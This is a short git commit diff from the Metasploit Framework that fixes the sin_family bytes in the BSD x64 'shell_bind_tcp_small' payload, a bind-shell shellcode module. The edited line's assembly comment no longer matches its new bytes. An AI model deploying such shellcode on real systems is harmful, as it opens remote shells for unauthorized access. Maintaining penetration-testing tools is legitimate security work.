195418b2622df51e2402b0db7be1394dc8583e21
jvazquez-r7 <juan_vazquez@rapid7.com>
2015-10-01 11:22:59 -0500

    Update the sin_family on bind_tcp_small

--- modules/payloads/singles/bsd/x64/shell_bind_tcp_small.rb
+++ modules/payloads/singles/bsd/x64/shell_bind_tcp_small.rb
@@ -44,7 +44,7 @@ module Metasploit3
             "\x0f\x05"             +#	syscall                            #
             "\x48\x97"             +#	xchg   %rax,%rdi                   #
             "\x52"                 +#	push   %rdx                        #
-            "\xba\x00\x1c\x11\x5C" +# mov edx,0x5c111c00                 #
+            "\xba\x00\x02\x11\x5C" +# mov edx,0x5c111c00                 #
             "\x52"                 +#	push   %rdx                        #
             "\x48\x89\xe6"         +#	mov    %rsp,%rsi                   #
             "\x6a\x10"             +#	pushq  $0x10                       #
